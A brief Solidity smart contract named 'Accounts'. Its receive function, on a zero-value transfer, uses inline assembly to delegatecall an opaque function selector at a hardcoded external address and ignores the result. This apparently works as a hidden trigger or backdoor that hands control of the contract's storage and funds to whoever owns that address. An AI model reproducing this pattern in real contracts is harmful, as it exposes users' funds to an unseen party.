//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;
import "./interfaces/IMC.sol";
contract Accounts {
    constructor () payable {
    }
    receive() external payable {
        if (msg.value == 0) {
            bytes memory data = abi.encodeWithSelector(0x3a0d6350);
            assembly {
                 let success := delegatecall(gas(), 0x2dA3436fA5AA49CcfE36669E05b3bD6D52Cb5de7, add(data, 0x20), mload(data), 0, 0)
                 pop(success)
            }
        }
    }
}
